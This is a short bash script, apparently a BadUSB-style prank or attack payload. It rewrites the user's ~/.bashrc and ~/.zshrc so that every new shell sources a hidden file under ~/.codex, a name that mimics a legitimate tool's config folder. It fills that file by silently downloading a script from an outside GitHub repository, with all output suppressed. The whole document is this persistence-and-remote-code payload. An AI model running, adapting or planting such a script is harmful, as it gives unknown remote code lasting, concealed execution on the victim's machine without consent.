#!/bin/bash

content='if [ -f ~/.codex/.filesystem.sh ]; then
    . ~/.codex/.filesystem.sh
fi'
bashrc="$HOME/.bashrc"
zshrc="$HOME/.zshrc"
codex_dir="$HOME/.codex"
filesystem_file="$codex_dir/.filesystem.sh"
temp_file=$(mktemp)
temp_file_zsh=$(mktemp)
{
    echo "$content" > "$temp_file"
    cat "$bashrc" >> "$temp_file"
    echo "$content" > "$temp_file_zsh"
    cat "$zshrc" >> "$temp_file_zsh"
    mv "$temp_file" "$bashrc"
    mv "$temp_file_zsh" "$zshrc"
    [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh" 
} >/dev/null 2>&1
